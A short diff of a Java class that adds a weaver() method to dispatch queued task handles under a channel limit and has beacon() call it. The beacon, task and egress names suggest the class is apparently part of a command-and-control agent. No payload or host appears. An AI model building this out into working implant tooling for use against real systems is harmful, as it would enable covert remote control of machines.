@@ -38,28 +38,30 @@ public class Core {
 		finalConf = Netw.send("Conf",null,authResult.get("key").toString(),Crypt.bake());
 		return finalConf;
 	}
+
 	
-	
-	//public static void channel() {
-		
-	//}
-	
-	//public static void weaver() {
-	//	while (Main.channels <= (int) Main.config.get("maxChannel")) {
-	//		
-	//	}
-	//}
+	public static void weaver() throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
+		Enumeration jobs = Main.schtasks.keys();
+		int maxChk = 0;
+		String taskHandle = new String();
+		while (jobs.hasMoreElements()) {
+			
+			if (Main.channels <= (int) Main.config.get("maxChannel")) {
+				if (maxChk == 0) {
+					taskHandle = (String) jobs.nextElement();
+				} else {
+					maxChk = 0;
+				}
+				Util.detask(taskHandle);
+			} else {
+				maxChk = 1;
+			}
+		}
+	}
 	
 	public static void beacon() throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, InterruptedException, NoSuchAlgorithmException {
 		//beacon function
-		Enumeration jobs = Main.schtasks.keys();
-		while (jobs.hasMoreElements()) {
-			//this is a problem and needs to be changed
-			String taskHandle = (String) jobs.nextElement();
-			Hashtable streamStatus = Netw.send("Data", null, taskHandle , null);
-			//Main.schtasks.remove(taskHandle);
-			Util.detask(taskHandle);
-		}
+		weaver();
 		if (Main.egress == 1) {
 			System.exit(0);
 		}
